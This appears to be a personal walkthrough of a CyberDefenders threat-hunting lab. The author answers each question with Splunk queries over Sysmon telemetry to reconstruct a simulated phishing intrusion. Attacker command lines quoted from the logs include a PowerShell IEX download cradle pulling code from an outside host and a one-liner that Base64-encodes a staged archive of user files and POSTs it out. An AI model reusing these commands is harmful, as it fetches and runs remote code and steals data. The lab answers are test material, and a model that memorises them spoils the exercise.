# CyberDefenders Lab - GhostConnect (TA583)

This was the first CyberDefenders lab I completed as I got access to it for free as part of the Certified Cyber Defender Level 1 (CCDL1) course. I completed this lab after successfully passing the exam, during which I struggled with querying Splunk. In completing this lab, I gained experience running SPL queries without the guidance offered in the course. It is highly likely that the following methodology and SPL queries could be further refined, however the below walkthrough is how I managed to successfully complete this lab unaided. 

---
## Scenario:

On April 21, 2026, a FedBridge analyst grew suspicious after opening a link in their inbox and later ran a manual antivirus scan that flagged a persistence installer on their workstation. Initial triage revealed unexpected script execution, PowerShell activity, and outbound connections to external servers. You have been provided with endpoint telemetry and recovered browser artifacts. Reconstruct the full intrusion from the initial lure through data exfiltration, surfacing the operator's mistakes along the way.

## Question 1
The compromise began on a workstation when a user launched the email client on FB-WKS64. What is the username of the compromised account?

- First ran: `index=* host="FB-WKS64"` to see what came back
- Narrowed the time window to just `Tuesday 21 Apr 26`
- As I was looking for a process launch, added the source of `"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"` and `EventCode=1` to the search
- In doing this, I saw there was a `process_name` field, so included both `olk.exe` or  `outlook.exe` in my search.
- Final search was:

```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 process_name="*olk.exe" OR process_name="*outlook.exe"
```

- This search provided 3 results, all of which listed the User as `"chriskarma"`
- The results also showed that the process_name was `"olk.exe"`, indicating that the new Outlook for Windows was used.
- I also took note of the event times, which were - `13:25:12`, `13:28:06` and `13:28:31`

## Question 2

The user clicked a link inside the email, which spawned a browser. What is the full URL of the delivery page the victim was directed to?

- First, I added `user=chriskarma` to the search to keep the results narrow
- I then changed `"*olk.exe"` from `process_name` to `parent_process_name`
- This gave me 6 results, one of which had in its `CommandLine` field:
```
"C:\Program Files\Google\Chrome\Application\chrome.exe" --single-argument http://52.59.253.168/download_invitee.php
```
- This event occurred at `13:38:25`

## Question 3

The lure page automatically downloaded a malicious script to the host. What is the full source URL it was originally downloaded from?

- I first changed from Sysmon EventCode 1 in the previous search to `EventCode=15`
    - by showing File Creation events that originated from outside the network, this would show me the `HostUrl` field, which is not a standard event field in Sysmon EventCode 11.
- I then added `Contents="*http://52.59.253.168/download_invitee.php*"` to my search
- By then looking at the `HostUrl` field, I was able to see the correct answer: `http://52.59.253.168/E-INVITE.vbs`
- This event occurred at `13:38.44`

## Question 4

Once executed, the dropped script orchestrated the next stage by spawning multiple child processes within seconds. List the two children of `wscript.exe` in chronological order.

- I first changed back to Sysmon `EventCode=1` and saw that `E-INVITE.vbs` had created `wscript.exe`
- I then ran a further search that included `ParentImage="*wscript.exe*"`
- Sorting by `_time` gave me the chronological order of the events
- The results showed that `powershell.exe` launched at `13:38:53` and `chrome.exe` launched at `13:39:04`

## Question 5

The next-stage payload was retrieved from a legitimate cloud-hosting service. What is the file ID embedded in that download URL?

- As I again wanted to see the `HostUrl` field, I went back to EventCode 15 and ran:

```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=15 Contents="*HostUrl=*"
| sort _time
```

- The first result at `13:39:32` showed `HostUrl=https://drive.usercontent.google.com/download?id=1Yqzl-L-1FGWm4iOwieRFv9zr0urEEGWR`

## Question 6

After extracting the second-stage archive, the user double-clicked the loader executable. What is the full file path of the first-stage loader?

- I initially simplified my search in order to find the archive extraction by running:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"  EventCode=1
| sort _time
```
- An event at `13:39:43` showed the CommandLine `"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\chriskarma\Downloads\FileServer\"` 
- This confirmed the archive extraction
- I then pivoted off this timestamp to show file creation events through `EventCode=11` after this time
- To make finding the answer easier, I added the `TargetFilename` to the selected fields in Splunk

Answer: `TargetFilename = C:\Users\chriskarma\Downloads\FileServer\FileServer.exe`

## Question 7

Among the loader's discovery commands, one queried a specific scheduled task by name, likely an OPSEC check to verify a prior footprint. What task name was queried?

- I ran the following search to see what scheduled tasks (`schtasks.exe`) were queried by the parent process of `FileServer.exe`: 
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" process_name="schtasks.exe" parent_process_name="FileServer.exe"
| sort _time
```
- This provided a single event at `15:18:17`, with the CommandLine: `"schtasks" /query /tn vulntask /fo list /v`

## Question 8
The loader inspected the ACL on a single file, suggesting preparation for a hijack or overwrite. What is the full path of that file?

- To see what the FileServer.exe did, I ran:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" parent_process_name="FileServer.exe"
| sort _time
```
- I added the `CommandLine` field to the selected fields to make it easier to skim through what it did
- I saw `icacls` in one of the commands, which manages Access Control Lists
- The full CommandLine was: `"icacls" c:\tasks\schtask.bat`
- This event occurred at `15:20:23`


## Question 9
AD enumeration was performed via a wrapper script that was iteratively re-staged in two different filesystem locations during the operation. List both full paths of `adf.bat` in the order they appeared.

- Unknowingly, the search I ran to answer this question also provided the answer to many subsequent questions. The search was:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" parent_process_name="FileServer.exe" CommandLine="*adf.bat*"
| sort _time
```
- I then looked through the `CommandLine` of the 8 events that were returned and saw that the file had been placed in `C:\Windows\Temp\adf.bat` and `C:\Users\chriskarma\AppData\Roaming\adf.bat`

## Question 10
The wrapper script queried four distinct Active Directory object types using LDAP objectcategory filters. List the four objectcategory values in the order the assembly commands ran.

- As mentioned, the previous search also provided the correct answer to this question, with the `objectcategory` appearing in all of the `CommandLine` fields

Answers: `computer`, `person`, `organizationalunit`, `group`

## Question 11
After execution, the first-stage loader retrieved and ran a second-stage implant. What is the full file path where it was written to disk?

- Another question answered by my previous search:
- At `14:52:52`, an event was returned with the `CommandLine`: `"C:\Users\chriskarma\AppData\Local\FileR.exe"`

## Question 12
What is the SHA256 hash of the second-stage loader?

- I looked for the process creation event for the second-stage loader `FileR.exe` using the following search:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 process_name="FileR.exe"
| sort _time
```
- This returned a single event at timestamp `14:52:52` with the SHA256 hash: `8BAB731AC2F7D015B81C2002F518FFF06EA751A34A711907E80E98CF70B557DB`

## Question 13
Threat intel links the second-stage loader to a known malware family. What is the family name and its first-seen-in-the-wild date?

- For this question, I opened VirusTotal and entered the Hash from the previous question as a search
- On the Detection tab, found `"SilentConnect"` as the malware family, listed by one of the vendors (Dr Web)
    - I found it interesting that only a single vendor noted this as the malware family
- On the Details tab, I found the First Submission date of `2026-03-10 18:48:19`

## Question 14
One of the loaders retrieved an additional payload from a secondary C2 server distinct from the delivery infrastructure. What is the complete URL being fetched?

- For this question, I ran a similar search to what I had been using before:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" parent_process_name="FileR.exe" OR parent_process_name="FileServer.exe"
| sort _time
```
- This returned 27 events
- The event at `15:47:31` had in its `CommandLine`: `"powershell.exe" -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://34.228.194.206:80/f'))"`
- I was therefore able to extract the correct answer of: `http://34.228.194.206:80/f`

## Question 15
A Python reverse shell to the primary C2 reveals the operator's source template, the script ends by spawning a non-native shell binary that wouldn't even resolve on Windows. What is the path of the shell binary in the `subprocess.call` list?

- This was the question I struggled with the most as it required knowledge of a specific Sysmon query pattern that I hadn't used before. I therefore used the hints CyberDefenders provides to gently nudge me in the right direction, before ultimately running the search myself
- CyberDefenders advised searching for EventCode 1, with the process being `cmd.exe` and the parent process of `powershell.exe`
- In the `CommandLine` of an event that occurred at `16:29:11`, I found the path `"/bin/sh"`

## Question 16
A persistence installer was dropped to the victim's Downloads folder well before the user was induced to execute it. What is the UTC timestamp when this MSI file was first written to disk?

- I ran:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=11 TargetFilename="*.msi*"
| sort _time
```
- This provided several results, indicating that I could likely have refined this search further. Right now, that is slightly beyond my ability, so I looked through the process names for anything suspicious and found 2 events with `powershell.exe`
- An event at `2026-04-21 16:33` with the path `C:\Users\chriskarma\Downloads\0x001900000002b4b5-36.msi` shows when the MSI file was written to disk

## Question 17
The operator's first attempt to archive user data referenced source paths that don't exist on this host,  a clear sign of script-template reuse from a previous engagement. What username appears in those non-existent paths?

- This was another question I struggled with. However, on looking at the hints, I realised the answer was fairly obvious as I have seen numerous PowerShell commands in examples throughout the CCDL1 course that contained `Compress-Archive`. I therefore ran the following search:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 CommandLine="*Compress-Archive*"
| sort _time
```
- This produced 4 results, with `jdoe` appearing in the path of two of them

## Question 18
Before exfiltrating data, the attacker staged the victim's files by compressing two directories into a single archive. What is the full file path of the archive created during this staging step? 

- Using the same search as above, but this time focussing on the events in which the attacker used the correct username, the `CommandLine` read:
```
powershell -Command " Compress-Archive \ -Path @('C:\Users\chriskarma\Documents','C:\Users\chriskarma\Desktop') \ -DestinationPath 'C:\Windows\Temp\~sys_upd.zip' -Force"
```
- The answer is therefore: `C:\Windows\Temp\~sys_upd.zip`

## Question 19
The operator's PowerShell pipeline transformed the staged archive's bytes into a transmission-safe encoding before POSTing them out over HTTPS. What's the encoding scheme used and the full destination URL?

- Now knowing the zip file staged for extraction, ran:
```
index=main host="FB-WKS64" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 CommandLine="*~sys_upd.zip*"
| sort _time
```
- An event at `16:31:26` shows the `CommandLine`:
```
powershell -Command " $bytes = [System.IO.File]::ReadAllBytes('C:\Windows\Temp\~sys_upd.zip'); $b64 = [Convert]::ToBase64String($bytes); Invoke-WebRequest -Uri 'https://52.59.253.168/upload' \ -Method POST -Body $b64 -ContentType 'text/plain' -UseBasicParsing"
```
- The `$b64` in this command indicates that Base64 was the encoding used, and `https://52.59.253.168/upload` was the full destination URL

---

# Conclusion

As the first lab I have completed after successfully passing the CCDL1 exam, which revealed Splunk to be my weakest area overall, I was really pleased to get through this lab by myself, unaided. Just by trying (and failing) several times, I was able to refine my command of SPL and correctly answer all the questions posed. While I will undoubtedly improve at this with further practice (and will likely look back on the searches I ran as being rudimentary), this is a good starting point. It just goes to show how valuable the free labs are for the CCDL1 exam, and I'm disappointed that I didn't have time to complete this before my exam attempt expired.